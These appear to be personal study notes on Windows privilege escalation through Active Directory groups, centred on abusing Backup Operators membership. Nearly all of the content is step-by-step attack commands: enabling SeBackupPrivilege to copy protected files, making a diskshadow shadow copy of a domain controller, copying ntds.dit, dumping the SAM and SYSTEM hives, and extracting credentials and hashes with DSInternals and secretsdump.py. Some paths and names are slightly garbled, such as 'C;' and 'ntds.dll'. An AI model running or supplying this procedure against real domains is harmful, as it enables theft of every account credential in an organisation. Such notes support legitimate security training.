Privileged Accounts & Groups in AD:
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory

- Backup Operators group
- Event Log Readers group
- DnsAdmins group
- Hyper-V Administrators group
- Print Operators group
- Server Operators group

### Backup Operators Group

`whoami /groups` shows that our user is a member of Backup Operators.
Being part of this group grants it's members `SeBackup` and `SeRestore` privileges.

`SeBackupPrivilege` allows us to traverse any folder and list the folder contents.
This let's us copy a file from the folder, even if there's no ACE for us in the folder's ACL.

We need to programmatically copy the data, making sure to specify `FILE_FLAG_BACKUP_SEMANTICS`.
```
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

whoami /priv => SeBackupPrivilege (Disabled)

Set-SeBackupPrivilege
Get-SeBackupPrivilege

dir C:\Confidential\
Copy-FileSeBackupPrivilege "C;\Confidential\2022 Contract.txt" .\A.txt
```

### Attacking a Domain Controller - Copying NTDS.dit

With the backup permission, we can log into a DC locally. We can create a shadow copy:
```
diskshadow.exe

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup

add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit

dir E:

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

### Backup up SAM and SYSTEM
```
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```

### Extracting Credentials from NTDS.dit
```
Import-module .\DSInternals.psd1

$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=amdinistrator,CN=users,DC=domin,DC=local' \
	-DBPath .\ntds.dit -BootKey $key
```

### Extracting Hashes with secretsdump.py
```bash
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

### Robocopying

```
robocopy /B E:\Windows\NTDS .\ntds ntds.dll
```